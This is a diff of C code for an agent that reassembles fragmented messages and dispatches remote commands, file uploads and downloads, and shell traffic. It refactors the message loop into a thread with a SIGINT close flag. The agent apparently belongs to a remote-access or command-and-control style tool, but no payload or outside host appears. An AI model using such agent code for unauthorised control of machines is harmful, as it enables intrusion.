@@ -3,6 +3,8 @@
 #include <pthread.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdbool.h>
+#include <signal.h>
 
 #include <arpa/inet.h>
 
@@ -20,6 +22,8 @@ extern Queue* shell_receive_queue;
 extern pthread_mutex_t shell_receive_queue_lock;
 extern Queue* shell_send_queue;
 extern pthread_mutex_t shell_send_queue_lock;
+// SIGINT flags
+extern volatile sig_atomic_t agent_close_flag;
 
 STATIC int agent_handle_command(Assembled_Message* a_message){
 	Queue_Message* message = malloc(sizeof(Queue_Message));
@@ -133,15 +137,16 @@ int agent_handle_message_fragment(Assembled_Message* a_message){
 
 int agent_handle_complete_message(Assembled_Message* a_message){
 	int ret_val = RET_OK;
-	
-	if (a_message->last_fragment_index != -1 && a_message->total_message_size == a_message->current_message_size){
+
+	if (a_message->type == TYPE_PUT_FILE){
+		agent_handle_put_file(a_message);
+	}
+	// check if we received all fragments
+	else if (a_message->last_fragment_index != -1 && a_message->total_message_size == a_message->current_message_size){
 		debug_print("received full message %d, %d, %s\n", a_message->type, a_message->total_message_size, a_message->complete_message);
 		a_message->last_fragment_index = -1;
 		if (a_message->type == TYPE_COMMAND){
 			agent_handle_command(a_message);
-		}
-		else if (a_message->type == TYPE_PUT_FILE){
-			agent_handle_put_file(a_message);
 		}
 		else if (a_message->type == TYPE_GET_FILE){
 			agent_handle_get_file(a_message);
@@ -155,25 +160,20 @@ int agent_handle_complete_message(Assembled_Message* a_message){
 	return ret_val;
 }
 
-void* agent_handle_message(void*){
-	int ret_val;
-	Assembled_Message assembled_message = {0};
-	assembled_message.last_fragment_index = -1;
+STATIC int agent_handle_message(Assembled_Message* a_message){
 	
-	for (;;){
-		if ((ret_val = agent_handle_message_fragment(&assembled_message)) != RET_OK){
-			printf("ERROR agent_handle_message_fragment\n");
-			exit(ret_val);
-		}
-		
-		if ((ret_val = agent_handle_complete_message(&assembled_message)) != RET_OK){
-			printf("ERROR agent_handle_complete_message\n");
-			exit(ret_val);
-		}
+	if (agent_handle_message_fragment(a_message) != RET_OK){
+		printf("ERROR agent_handle_message_fragment\n");
+		return RET_ERROR;
 	}
-	return 0;
-}
 	
+	if (agent_handle_complete_message(a_message) != RET_OK){
+		printf("ERROR agent_handle_complete_message\n");
+		return RET_ERROR;
+	}
+
+	return RET_OK;
+}
 
 int agent_prepare_message(int type, char* buffer, int message_size){
 	Queue_Message* q_message;
@@ -218,11 +218,20 @@ int agent_prepare_message(int type, char* buffer, int message_size){
 	}
 	
 	free(buffer);
-	
-	return 0;	
+	return RET_OK;	
 }
 
+void *agent_handler_thread(void *vargp){
+	Assembled_Message assembled_message = {0};
+	assembled_message.last_fragment_index = -1;
 
+	while(!agent_close_flag){
+		if (agent_handle_message(&assembled_message) != RET_OK){
+			printf("agent_handler_thread error\n");
+			agent_close_flag = true;
+		}
+	}
 
-
-	
+	debug_print("%s\n", "agent_handler_thread done");
+	return 0;
+}
